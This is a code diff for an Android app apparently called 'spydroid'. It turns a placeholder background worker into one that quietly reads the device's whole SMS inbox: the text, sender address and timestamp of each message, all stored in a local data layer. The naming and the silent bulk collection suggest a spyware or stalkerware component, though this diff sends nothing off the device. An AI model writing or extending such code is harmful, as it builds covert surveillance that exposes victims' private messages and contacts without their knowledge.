@@ -17,36 +17,63 @@
 
 package net.spydroid.feature.sms
 
+import android.Manifest
+import android.content.ContentResolver
 import android.content.Context
+import android.content.pm.PackageManager
+import android.database.Cursor
+import android.icu.text.SimpleDateFormat
+import android.net.Uri
+import android.provider.Telephony
 import android.util.Log
+import androidx.core.content.ContextCompat
 import androidx.work.Worker
 import androidx.work.WorkerParameters
-import kotlinx.coroutines.GlobalScope
-import kotlinx.coroutines.delay
-import kotlinx.coroutines.launch
+import net.spydroid.common.local.LocalDataProvider
+import net.spydroid.common.local.models.CurrentSms
+import net.spydroid.feature.sms.local.domain.SmsRepository
+import net.spydroid.feature.sms.local.models.SmsHandler
+import java.util.Date
+import java.util.Locale
+import javax.inject.Inject
+class SmsWork(private val context: Context, workerParams: WorkerParameters) :
+    Worker(context, workerParams) {
 
-class SmsWork(appContext: Context, workerParams: WorkerParameters)  :
-    Worker(appContext, workerParams) {
+    private val contentResolver: ContentResolver = context.contentResolver
+    private val localDataProvider = LocalDataProvider.current(context)
 
     override fun doWork(): Result {
-        // Aquí va la lógica del trabajo en segundo plano
         try {
-            // Simulación de trabajo en segundo plano (puedes reemplazarlo con tu lógica)
-            var number = 0
-            while (number < 5) {
-                GlobalScope.launch {
-                    Log.d("MyWorker", "Trabajo en segundo plano ejecutándose")
-                    delay(5000) //delay 5 seconds
-                    number ++
+            val uri: Uri = Telephony.Sms.CONTENT_URI
+            val cursor: Cursor? = contentResolver.query(uri, null, null, null, null)
+
+            cursor?.use {
+                val indexBody = it.getColumnIndex(Telephony.Sms.BODY)
+                val indexAddress = it.getColumnIndex(Telephony.Sms.ADDRESS)
+                val indexDate = it.getColumnIndex(Telephony.Sms.DATE)
+
+                while (it.moveToNext()) {
+                    val body = it.getString(indexBody)
+                    val address = it.getString(indexAddress)
+                    val date = it.getLong(indexDate)
+
+                    val dateSent = Date(date)
+                    val format = SimpleDateFormat("dd/MM/yyyy HH:mm:ss", Locale.getDefault())
+                    val dateSentFormatted = format.format(dateSent)
+
+                    localDataProvider.setSmsCurrent(
+                        CurrentSms(
+                            address = address,
+                            body = body,
+                            date = dateSentFormatted
+                        )
+                    )
                 }
-
+            } ?: run {
+                return Result.failure()
             }
-
-
-            // Si el trabajo se completó exitosamente
             return Result.success()
         } catch (e: Exception) {
-            // Si hubo un fallo en el trabajo
             return Result.failure()
         }
     }
